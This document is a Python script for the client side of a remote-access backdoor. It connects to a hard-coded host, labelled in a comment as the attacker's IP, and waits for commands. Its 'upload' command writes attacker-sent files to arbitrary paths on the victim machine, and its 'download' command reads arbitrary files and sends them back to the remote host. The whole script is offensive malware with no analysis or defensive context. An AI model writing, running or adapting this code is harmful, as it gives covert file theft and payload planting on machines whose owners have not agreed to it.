import socket
import os

HOST = '10.0.1.37'  # Replace with attacker's IP
PORT = 9999

def main():
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as client:
        client.connect((HOST, PORT))
        print("[*] Connected to server.")

        while True:
            command = client.recv(1024).decode()

            if command.startswith("upload"):
                parts = command.split()
                dest_path = parts[3]
                file_size = int(client.recv(1024).decode())
                client.sendall(b'READY')
                data = b''
                while len(data) < file_size:
                    data += client.recv(4096)
                with open(dest_path, 'wb') as f:
                    f.write(data)
                print(f"[*] Received file and saved to {dest_path}")

            elif command.startswith("download"):
                parts = command.split()
                filename = parts[1]
                if os.path.exists(filename):
                    with open(filename, 'rb') as f:
                        data = f.read()
                    client.sendall(str(len(data)).encode())
                    ack = client.recv(1024)
                    if ack.decode() == 'READY':
                        client.sendall(data)
                else:
                    client.sendall(b'0')

            elif command == 'exit':
                break

if __name__ == "__main__":
    main()
